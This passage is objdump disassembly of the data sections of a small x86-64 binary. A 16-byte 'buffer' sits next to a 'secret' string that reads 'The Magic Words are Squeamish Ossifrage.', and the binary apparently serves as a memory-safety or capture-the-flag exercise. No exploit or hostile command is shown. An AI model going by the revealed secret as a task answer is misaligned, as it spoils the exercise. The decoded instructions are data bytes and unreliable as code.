  201f2a:	ff 6f 00             	ljmp   *0x0(%rdi)
  201f2d:	00 00                	add    %al,(%rax)
  201f2f:	00 01                	add    %al,(%rcx)
  201f31:	00 00                	add    %al,(%rax)
  201f33:	00 00                	add    %al,(%rax)
  201f35:	00 00                	add    %al,(%rax)
  201f37:	00 f0                	add    %dh,%al
  201f39:	ff                   	(bad)  
  201f3a:	ff 6f 00             	ljmp   *0x0(%rdi)
  201f3d:	00 00                	add    %al,(%rax)
  201f3f:	00 20                	add    %ah,(%rax)
  201f41:	04 00                	add    $0x0,%al
  201f43:	00 00                	add    %al,(%rax)
  201f45:	00 00                	add    %al,(%rax)
  201f47:	00 f9                	add    %bh,%cl
  201f49:	ff                   	(bad)  
  201f4a:	ff 6f 00             	ljmp   *0x0(%rdi)
  201f4d:	00 00                	add    %al,(%rax)
  201f4f:	00 03                	add    %al,(%rbx)
	...

Disassembly of section .got:

0000000000201fa8 <_GLOBAL_OFFSET_TABLE_>:
  201fa8:	b8 1d 20 00 00       	mov    $0x201d,%eax
	...
  201fbd:	00 00                	add    %al,(%rax)
  201fbf:	00 96 05 00 00 00    	add    %dl,0x5(%rsi)
  201fc5:	00 00                	add    %al,(%rax)
  201fc7:	00 a6 05 00 00 00    	add    %ah,0x5(%rsi)
  201fcd:	00 00                	add    %al,(%rax)
  201fcf:	00 b6 05 00 00 00    	add    %dh,0x5(%rsi)
	...

Disassembly of section .data:

0000000000202000 <__data_start>:
	...

0000000000202008 <__dso_handle>:
  202008:	08 20                	or     %ah,(%rax)
  20200a:	20 00                	and    %al,(%rax)
	...

0000000000202020 <bufferSize>:
  202020:	10 00                	adc    %al,(%rax)
	...

0000000000202040 <buffer>:
  202040:	00 01                	add    %al,(%rcx)
  202042:	02 03                	add    (%rbx),%al
  202044:	04 05                	add    $0x5,%al
  202046:	06                   	(bad)  
  202047:	07                   	(bad)  
  202048:	08 09                	or     %cl,(%rcx)
  20204a:	0a 0b                	or     (%rbx),%cl
  20204c:	0c 0d                	or     $0xd,%al
  20204e:	0e                   	(bad)  
  20204f:	0f 00 00             	sldt   (%rax)
	...

00000000002020e0 <secret>:
  2020e0:	54                   	push   %rsp
  2020e1:	68 65 20 4d 61       	pushq  $0x614d2065
  2020e6:	67 69 63 20 57 6f 72 	imul   $0x64726f57,0x20(%ebx),%esp
  2020ed:	64 
  2020ee:	73 20                	jae    202110 <__TMC_END__>
  2020f0:	61                   	(bad)  
  2020f1:	72 65                	jb     202158 <array+0x18>
  2020f3:	20 53 71             	and    %dl,0x71(%rbx)
  2020f6:	75 65                	jne    20215d <array+0x1d>
  2020f8:	61                   	(bad)  
  2020f9:	6d                   	insl   (%dx),%es:(%rdi)
  2020fa:	69 73 68 20 4f 73 73 	imul   $0x73734f20,0x68(%rbx),%esi
  202101:	69 66 72 61 67 65 2e 	imul   $0x2e656761,0x72(%rsi),%esp
	...

0000000000202109 <junk>:
  202109:	03                   	.byte 0x3

Disassembly of section .bss:

0000000000202120 <completed.7697>:
	...

0000000000202121 <temp>:
	...

0000000000202140 <array>:
	...

0000000000302140 <unused3>:
	...

0000000000302240 <unused1>:
	...

0000000000302340 <bigNumberBuffer>:
	...

0000000000402340 <unused2>:
	...

Disassembly of section .comment:

0000000000000000 <.comment>:
   0:	47                   	rex.RXB
   1:	43                   	rex.XB
   2:	43 3a 20             	rex.XB cmp (%r8),%spl
   5:	28 55 62             	sub    %dl,0x62(%rbp)
   8:	75 6e                	jne    78 <_init-0x4e8>
   a:	74 75                	je     81 <_init-0x4df>
   c:	20 37                	and    %dh,(%rdi)
   e:	2e 34 2e             	cs xor $0x2e,%al
  11:	30 2d 31 75 62 75    	xor    %ch,0x75627531(%rip)        # 75627548 <_end+0x75225108>
  17:	6e                   	outsb  %ds:(%rsi),(%dx)
  18:	74 75                	je     8f <_init-0x4d1>
  1a:	31 7e 31             	xor    %edi,0x31(%rsi)
  1d:	38 2e                	cmp    %ch,(%rsi)
  1f:	30 34 2e             	xor    %dh,(%rsi,%rbp,1)
  22:	31 29                	xor    %ebp,(%rcx)
  24:	20 37                	and    %dh,(%rdi)
  26:	2e 34 2e             	cs xor $0x2e,%al
  29:	30 00                	xor    %al,(%rax)
